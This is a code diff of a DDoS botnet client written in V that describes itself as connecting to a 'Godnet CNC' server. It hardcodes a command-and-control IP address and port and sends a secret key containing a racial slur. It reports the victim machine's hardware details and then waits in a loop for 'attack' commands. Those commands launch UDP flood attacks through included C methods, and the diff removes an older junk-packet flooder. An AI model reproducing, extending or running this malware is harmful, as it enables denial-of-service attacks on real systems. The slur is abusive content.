@@ -3,12 +3,19 @@ import os
 import net
 import rand
 
-import methods
+#include "@VROOT/methods/udp.c"
+#include "@VROOT/methods/http.c"
+// #include "@VROOT/methods/tcp.c"
+
+fn C.udp_bypass(&char, u16, int)
+fn C.sendHTTP(&char, int)
+fn send_udp(ip string, p u16, t int) { C.udp_bypass(&char(ip.str), p, t) }
+fn send_http(ip string, t int) { C.sendHTTP(&char(ip.str), t) }
 
 pub const (
-	backend_ip 		= "194.87.68.204"
+	backend_ip 		= "74.50.67.38"
 	backend_port 	= 420
-	secret_key 		= ""
+	secret_key 		= "NIGGERBOB"
 )
 
 pub struct DeviceInfo 
@@ -20,10 +27,16 @@ pub struct DeviceInfo
 		arch	string
 		cores 	string
 		ram 	string
-		uname 	string
 }
 
 fn main() 
+{
+	for {
+		listen()
+	}
+}
+
+fn listen()
 {
 	mut net_socket := net.dial_tcp("${backend_ip}:${backend_port}") or {
 		println("[ X ] Error, Unable to start server....")
@@ -38,7 +51,7 @@ fn main()
 	*/
 	mut device_info := get_device_info()
 	net_socket.write_string("${secret_key}\n") or { 0 }
-	net_socket.write_string("${device_info.to_str()}\n") or { 0 }
+	net_socket.write_string("${device_info.to_str()}'}\n") or { 0 }
 
 	/* Listen To The Godnet CNC Server For New Attacks */
 	for {
@@ -51,11 +64,31 @@ fn main()
 		match cmd 
 		{
 			"attack" {
-				println("CAUGHT A NEW ATTACKSKIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII")
-				go methods.udp_flood(args[1], args[2], args[3])
-				net_socket.write_string("ATTACK SENT") or { 0 }
+
+				if args.len == 5 {
+					println("${args[4]} CAUGHT A NEW ATTACKSKIIIIIIIIIII")
+					match args[4]
+					{
+						"udp" {
+							go send_udp(args[1], args[2].u16(), args[3].int())
+							net_socket.write_string("ATTACK SENT\n") or { 0 }
+						}
+						"tcp" {
+							// go methods.tcp_flood(args[1], args[2], args[3])
+							net_socket.write_string("Coming soon....\n") or { 0 }
+						} 
+						"std" {
+							// go hexflood(args[1], args[2].int(), args[3].int())
+							net_socket.write_string("Coming soon....\n") or { 0 }
+						} else {}
+					}
+				} else {
+					println("[ X ] Error, An attack was caught but corrupted!\r\n=> ${args.len} ${args}")
+				}
+
 			} else {}
 		}
+		println("${data}")
 	}
 }
 
@@ -82,11 +115,11 @@ pub fn get_device_info() DeviceInfo
 	{ if line.starts_with("NAME=\"") { os_name = line.replace("NAME=\"", "").trim_space() } }
 
 	return DeviceInfo{ 	
-		os: os_name
-		cpu: cpu_name, 
+		os: os_name.replace("\"", "").trim_space()
+		cpu: cpu_name.trim_space(), 
 		arch: lscpu[0].replace("Architecture:", "").trim_space(), 
-		cores: cpu_cores,
-		uname: os.execute("uname -a").output 
+		cores: cpu_cores.trim_space(),
+		ram: os.execute("cat /proc/meminfo").output.replace("MemTotal:", "").replace(" ", "").trim_space()
 	}
 }
 
@@ -96,28 +129,5 @@ pub fn (mut d DeviceInfo) to_str() map[string]string
 			 "cpu": d.cpu,
 			 "arch": d.arch,
 			 "cores": d.cores,
-			 "uname": d.uname }
-}
-
-/*
-	Knowing linux cant handle special keys, this UDP 
-	will most likely crash anything not handling UDP correctly
-*/
-pub fn udp(host string, p string, t string)
-{
-	mut c := net.dial_udp("${host}:${p}") or { return }
-    c.write_string(randomize_hex(255)) or { 0 }
-    c.close() or { return }
-}
-
-fn randomize_hex(hex_sz int) string
-{
-    mut new_hex := ""
-    chars := "qwertyuiopasdfghjklzxcvbnm1234567890-=`[]\\;',./<>?L●☻☺♠♣♥♦♪◘№℅Ω™℮℗₸₷₵₳₴₱₲₿₥₤₣:\"{}|_+~╓╔®╕╖╗©╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬▀▄█▌▐░▒▓►▼◄▲".split("")
-    for _ in 0..hex_sz
-    {
-        num := rand.int_in_range(0, chars.len) or { 0 }
-        new_hex += chars[num]
-    }
-    return new_hex
+			 "ram": d.ram }
 }
